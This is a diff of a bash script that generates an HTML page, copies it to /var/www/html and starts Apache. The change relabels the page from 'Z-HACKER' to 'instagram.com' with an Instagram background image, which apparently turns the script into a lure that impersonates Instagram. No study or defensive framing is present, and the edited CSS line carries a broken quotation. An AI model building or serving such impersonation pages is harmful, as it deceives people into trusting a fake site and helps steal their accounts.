@@ -19,10 +19,10 @@ read -p '           URL: ' varurl
 echo "<!DOCTYPE html>
 <html>
    <head>
-      <title>Z-HACKER</title>
+      <title>instagram.com</title>
       <style type=\"text/css\">
          body {
-         background-image: url(\"skull.jpg\");
+         background-image: url(\instagram.jpg\");
          background-size: 1000px 1600px;
          background-repeat: no-repeat;
          }
@@ -55,7 +55,7 @@ echo "<!DOCTYPE html>
 </html>" > index.html
 
 mv index.html /var/www/html/index.html
-cp skull.jpg /var/www/html/skull.jpg
+cp instagram.jpg /var/www/html/instagram.jpg
 service apache2 start
 echo "         ______________________________________________________
          7      77  _  77  _  77     77  7  77  7  77  _  77  7
